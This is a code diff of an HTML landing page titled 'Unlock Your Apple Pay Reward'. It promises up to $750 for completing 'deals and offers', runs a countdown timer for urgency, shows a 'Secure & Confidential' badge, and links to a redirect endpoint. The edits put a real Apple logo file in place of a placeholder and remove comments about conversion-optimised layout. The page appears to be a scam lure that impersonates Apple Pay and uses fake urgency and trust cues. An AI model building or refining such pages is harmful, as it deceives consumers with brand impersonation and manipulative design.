@@ -185,8 +185,8 @@
             margin: 1.5rem auto 1rem;
             padding: 1rem;
             background: #1d1d1f0d;
-            border-radius: 16px;
             border: 1px solid #1d1d1f1a;
+            border-radius: 16px;
         }
         
         .instruction-item {
@@ -310,14 +310,12 @@
     <div id="particles-js"></div>
     <div class="page-container">
         <div class="reward-card">
-            <!-- Unified layout following optimal conversion flow: Headline > Urgency > Reward > CTA > Instructions -->
             <div class="app-logo-container">
-                <img src="/placeholder.svg?height=60&width=80" alt="Apple Pay Logo" class="app-logo">
+                <img src="applelogo.png" alt="Apple Pay Logo" class="app-logo">
                 <h1 class="main-headline">Unlock Your Apple Pay Reward</h1>
                 <p class="sub-headline">Earn up to $750 by completing simple deals and offers</p>
             </div>
             
-            <!-- Moved countdown timer before reward amount to create urgency -->
             <div class="countdown-container">
                 <div class="countdown-title">⏰ Limited Time Offer Expires In:</div>
                 <div class="countdown-timer" id="countdown">23:59:45</div>
@@ -326,7 +324,6 @@
             <div class="amount" id="amount">$750</div>
             <div class="amount-subtext">potential reward</div>
             
-            <!-- Single security badge placed near CTA for trust -->
             <div class="security-badge">
                 <svg class="security-icon" fill="currentColor" viewBox="0 0 20 20">
                     <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd" />
@@ -334,12 +331,10 @@
                 Secure & Confidential
             </div>
             
-            <!-- CTA button positioned after urgency and reward for optimal conversion -->
             <div class="button-container">
                 <a href="/api/redirect" id="claimButton" class="claim-button">Start Earning Now →</a>
             </div>
 
-            <!-- Instructions moved below CTA with improved horizontal layout -->
             <div class="instructions-container">
                 <div class="instruction-item">
                     <span class="number">1</span>
